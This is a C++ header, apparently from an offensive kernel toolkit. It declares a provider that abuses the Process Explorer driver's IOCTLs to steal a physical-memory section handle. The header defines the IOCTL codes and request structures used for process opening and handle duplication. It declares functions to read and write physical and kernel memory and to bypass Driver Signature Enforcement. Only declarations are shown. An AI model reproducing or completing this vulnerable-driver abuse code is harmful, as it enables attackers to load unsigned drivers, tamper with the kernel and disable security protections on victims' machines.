#pragma once
#include "IProvider.h"
#include <windows.h>
#include <winternl.h>
#include <vector>

// Process Explorer IOCTLs
#define PROCEXP_DEVICE_TYPE         0x8335
#define PROCEXP_FUNC_OPEN_PROCESS   0xF
#define PROCEXP_FUNC_DUP_HANDLE     0x5

#define IOCTL_PROCEXP_OPEN_PROCESS \
    CTL_CODE(PROCEXP_DEVICE_TYPE, PROCEXP_FUNC_OPEN_PROCESS, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define IOCTL_PROCEXP_DUPLICATE_HANDLE \
    CTL_CODE(PROCEXP_DEVICE_TYPE, PROCEXP_FUNC_DUP_HANDLE, METHOD_BUFFERED, FILE_ANY_ACCESS)

// System Information Classes (if not already defined)
#ifndef SystemExtendedHandleInformation
#define SystemExtendedHandleInformation (SYSTEM_INFORMATION_CLASS)64
#endif

typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX {
    PVOID Object;
    ULONG_PTR UniqueProcessId;
    ULONG_PTR HandleValue;
    ULONG GrantedAccess;
    USHORT CreatorBackTraceIndex;
    USHORT ObjectTypeIndex;
    ULONG HandleAttributes;
    ULONG Reserved;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX, *PSYSTEM_HANDLE_TABLE_ENTRY_INFO_EX;

typedef struct _SYSTEM_HANDLE_INFORMATION_EX {
    ULONG_PTR NumberOfHandles;
    ULONG_PTR Reserved;
    SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX Handles[1];
} SYSTEM_HANDLE_INFORMATION_EX, *PSYSTEM_HANDLE_INFORMATION_EX;

typedef struct _PEXP_DUPLICATE_HANDLE_REQUEST {
    HANDLE UniqueProcessId;
    ULONG_PTR Unused0;
    ULONG_PTR Unused1;
    HANDLE SourceHandle;
} PEXP_DUPLICATE_HANDLE_REQUEST, *PPEXP_DUPLICATE_HANDLE_REQUEST;

namespace KernelMode {
    namespace Providers {

        class ProcessExplorerProvider : public IProvider {
        public:
            ProcessExplorerProvider();
            ~ProcessExplorerProvider() override;

            bool Initialize(ULONG driverId = 0, bool bypassDSE = false) override;
            void Deinitialize() override;
            std::wstring GetProviderName() const override;
            ULONG GetCapabilities() const override;
            const ProviderLoadData* GetLoadData() const override;

            // Physical Memory specific implementation
            bool ReadPhysicalMemory(uintptr_t physicalAddress, void* buffer, size_t size) override;
            bool WritePhysicalMemory(uintptr_t physicalAddress, void* buffer, size_t size) override;

            // Mapped to Physical Memory
            bool ReadKernelMemory(uintptr_t address, void* buffer, size_t size) override;
            bool WriteKernelMemory(uintptr_t address, void* buffer, size_t size) override;

            // Not directly supported
            uintptr_t AllocateKernelMemory(size_t size, uintptr_t* allocatedAddress) override { return 0; }
            bool FreeKernelMemory(uintptr_t address, size_t size) override { return false; }
            bool CreateSystemThread(uintptr_t startAddress, uintptr_t parameter) override { return false; }
            uintptr_t VirtualToPhysical(uintptr_t virtualAddress) override;

            bool BypassDSE() override;

        private:
            HANDLE deviceHandle;
            SC_HANDLE serviceHandle;
            std::wstring dirDriverPath;
            HANDLE physicalMemorySection; // The stolen handle
            static ProviderLoadData loadData;

            bool InstallDriverService();
            bool OpenDeviceHandle();
            
            // Helper functions for the handle stealing technique
            bool AcquirePhysicalMemoryHandle();
            HANDLE GetPhysicalMemorySectionHandle();
            
            // Driver-specific operations
            bool DriverOpenProcess(HANDLE processId, ACCESS_MASK desiredAccess, PHANDLE processHandle);
            bool DriverDuplicateHandle(HANDLE sourceProcessId, HANDLE sourceHandle, PHANDLE targetHandle);
        };

    }
}
